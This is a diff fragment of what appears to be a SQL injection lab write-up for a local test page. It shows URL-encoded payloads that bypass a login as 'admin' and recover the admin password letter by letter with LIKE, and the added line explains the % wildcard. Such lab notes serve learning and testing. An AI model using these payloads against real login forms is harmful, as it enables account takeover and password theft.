@@ -43,6 +43,8 @@ use link , http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%23 , to log
 
 Finding password letter by letter
 
+LIKE "s%"  , checks if s is the first character,  % denote anything after s.
+
 Checking first letter of password is "A" , if shows hello guest , admin pass not start with a
 http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26pw%20LIKE%20%27 a %25%27%23
 
